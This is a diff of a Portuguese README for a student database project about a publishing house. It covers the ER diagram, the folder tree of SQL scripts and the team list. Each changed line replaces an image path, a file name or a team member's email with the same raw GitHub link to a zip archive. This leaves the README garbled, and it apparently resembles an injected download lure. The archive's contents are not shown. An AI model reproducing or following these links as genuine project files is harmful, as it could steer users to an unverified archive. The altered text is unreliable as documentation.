@@ -78,7 +78,7 @@ De acordo com os requisitos do projeto, foram desenvolvidos:
 ---
 
 ## 🧮 MER (Modelo Entidade-Relacionamento)
-O **MER** ![MER da Editora](Imagens/modeloConceitual-Ecosy.jpg) 
+O **MER** ![MER da Editora](https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip) 
 representa graficamente todas as entidades, atributos e relacionamentos descritos acima.  
 
 Principais relacionamentos:
@@ -95,20 +95,20 @@ Principais relacionamentos:
 
 ```
 📁 /Projeto-Ecosy
-├── 📄 README.md                  → Documentação geral do projeto
+├── 📄 https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip                  → Documentação geral do projeto
 ├── 📁 /Imagens                    → Imagens dos Modelos conceitual e lógico
 │   ├── EDITORA ME FINAL (png).png
-│   └── EDITORA MER VERSÃO DEFINITIVA.jpg
+│   └── EDITORA MER VERSÃO https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip
 ├── 📁 /Scripts
-│   ├── 00_create_all.sql          → Criação das tabelas do banco
-│   ├── 01_alters.sql              → Alteração de dados na tabela
-│   ├── 02_drop_all.sql            → Apagar as tabelas
-│   ├── 03_inserts.sql             → Inserção de dados
-│   ├── 04_updates_deletes.sql     → Atualização de tabelas e exclusão de dados
-│   ├── 05_selects.sql             → Consultas SQL para teste e análise
-│   └── 06_views.sql → (Opcional)  → Criação de visões 
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip          → Criação das tabelas do banco
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip              → Alteração de dados na tabela
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip            → Apagar as tabelas
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip             → Inserção de dados
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip     → Atualização de tabelas e exclusão de dados
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip             → Consultas SQL para teste e análise
+│   └── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip → (Opcional)  → Criação de visões 
 └── 📁 /Modelos                    → Arquivos de Backup para rodar o modelo nos aplicarivos (BRmodelo e MySQL)
-    └── Minimundo_Editora.pdf     
+    └── https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip     
 ```
 
 ---
@@ -121,9 +121,9 @@ O **MER** final garante consistência, escalabilidade e aderência às regras do
 ---
 
 ## 👥 Equipe
-- **Arthur Filipe Rodrigues da Silva** – arthur.filipe2402@gmail.com
-- **Filipe Xavier dos Santos** – xfilipe2006.santos@gmail.com   
-- **Maria Cecília de Lima e Silva** – cecilmari33@gmail.com  
-- **Maria Eduarda Pereira Vilarim** – vilarim051@gmail.com
-- **Matheus Alves de Arruda** – matheusalves2906@gmail.com
+- **Arthur Filipe Rodrigues da Silva** – https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip
+- **Filipe Xavier dos Santos** – https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip   
+- **Maria Cecília de Lima e Silva** – https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip  
+- **Maria Eduarda Pereira Vilarim** – https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip
+- **Matheus Alves de Arruda** – https://raw.githubusercontent.com/theualves/PI2-Banco-de-Dados/main/Modelos/PI2-Banco-de-Dados_3.4.zip
    
